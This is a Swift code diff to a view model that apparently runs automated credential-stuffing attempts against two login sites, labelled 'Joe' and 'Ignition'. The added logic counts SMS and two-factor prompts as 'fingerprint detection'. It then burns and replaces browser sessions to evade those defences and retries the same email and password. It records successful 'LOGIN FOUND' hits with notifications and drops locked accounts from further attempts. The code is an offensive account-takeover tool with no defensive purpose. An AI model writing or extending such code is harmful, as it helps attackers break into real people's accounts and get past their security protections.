@@ -633,21 +633,69 @@ class DualFindViewModel {
                 }
 
             case .disabled:
+                // "disabled" → permanently eliminate email from ALL testing on BOTH platforms + Burn & Rotate
                 disabledEmails.insert(email.lowercased())
-                log("[\(label)] \(email) — DISABLED (eliminated from all testing)", level: .error)
+                log("[\(label)] \(email) — DISABLED (eliminated from all testing on both platforms)", level: .error)
                 updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
 
-                let checkFields = await session.verifyLoginFieldsExist()
-                if checkFields.found < 2 {
-                    let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
-                    if reloaded {
-                        let newCal = await calibrateSession(session: session, site: site, label: label)
-                        setCalibration(site: site, index: sessionIndex, calibration: newCal)
-                        _ = await session.fillPasswordCalibrated(password, calibration: newCal)
+                log("[\(label)] Disabled detection → triggering Burn & Rotate protocol", level: .warning)
+                await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+
+            case .fingerprintDetected:
+                // SMS 2FA / fingerprint detection → Burn & Rotate, but do NOT eliminate the email — retry after sanitization
+                log("[\(label)] \(email) — FINGERPRINT DETECTED (SMS/2FA = burn signal, email preserved for retry)", level: .warning)
+                updateSession(id: sessionInfoId, email: email, status: "FP Detected", active: true)
+
+                await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+
+                guard let freshSession = getPersistentSession(site: site, index: sessionIndex) else {
+                    log("[\(label)] Replacement session unavailable after fingerprint burn", level: .error)
+                    incrementCompleted(for: site)
+                    continue
+                }
+
+                let retryOutcome = await retryEmailOnFreshSession(
+                    session: freshSession, email: email, password: password,
+                    site: site, sessionIndex: sessionIndex, label: label
+                )
+
+                switch retryOutcome {
+                case .success:
+                    let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
+                    hits.append(hit)
+                    latestHit = hit
+                    showLoginFound = true
+                    log("🎯 LOGIN FOUND (retry after FP burn): \(email) on \(site.rawValue)", level: .success)
+                    sendLoginFoundNotification(email: email, platform: site.rawValue)
+                    updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)
+
+                    saveResumePoint()
+
+                    if isJoe {
+                        isJoePaused = true
+                    } else {
+                        isIgnPaused = true
                     }
+
+                    while (isJoe ? isJoePaused : isIgnPaused) && !isStopping {
+                        try? await Task.sleep(for: .milliseconds(500))
+                    }
+                    if isStopping { break }
+                    showLoginFound = false
+
+                case .disabled:
+                    disabledEmails.insert(email.lowercased())
+                    log("[\(label)] retry after FP: \(email) — DISABLED (eliminated)", level: .error)
+                    updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
+                    await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+
+                default:
+                    log("[\(label)] retry after FP: \(email) — \(retryOutcome) (moving on)", level: .warning)
+                    updateSession(id: sessionInfoId, email: email, status: "Done", active: false)
                 }
 
             case .transient:
+                // Generic transient error → Burn & Rotate, do NOT eliminate email, retry same combo
                 log("[\(label)] \(email) — transient error, burning session & retrying", level: .warning)
                 updateSession(id: sessionInfoId, email: email, status: "Rebuilding", active: true)
 
@@ -692,6 +740,7 @@ class DualFindViewModel {
                     disabledEmails.insert(email.lowercased())
                     log("[\(label)] retry: \(email) — DISABLED (eliminated)", level: .error)
                     updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
+                    await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
 
                 default:
                     log("[\(label)] retry: \(email) — \(retryOutcome) (moving on)", level: .warning)
@@ -767,23 +816,19 @@ class DualFindViewModel {
             return .disabled
         }
 
-        if contentLower.contains("error") && !contentLower.contains("incorrect") && !contentLower.contains("invalid") && !contentLower.contains("wrong") {
-            return .transient
-        }
-
-        let isIgnition = urlLower.contains("ignition")
-        if isIgnition {
-            let smsKeywords = ["sms", "text message", "verification code", "verify your phone",
-                               "send code", "sent a code", "enter the code", "phone verification",
-                               "mobile verification", "confirm your number", "code sent",
-                               "enter code", "security code sent", "check your phone"]
-            for keyword in smsKeywords {
-                if contentLower.contains(keyword) {
-                    return .transient
-                }
+        // Anti-Fingerprinting: ANY SMS/2FA response = fingerprint detection (Burn signal)
+        let smsKeywords = ["sms", "text message", "verification code", "verify your phone",
+                           "send code", "sent a code", "enter the code", "phone verification",
+                           "mobile verification", "confirm your number", "code sent",
+                           "enter code", "security code sent", "check your phone",
+                           "two-factor", "2fa", "two factor"]
+        for keyword in smsKeywords {
+            if contentLower.contains(keyword) {
+                return .fingerprintDetected
             }
         }
-        if contentLower.contains("sms") {
+
+        if contentLower.contains("error") && !contentLower.contains("incorrect") && !contentLower.contains("invalid") && !contentLower.contains("wrong") {
             return .transient
         }
 
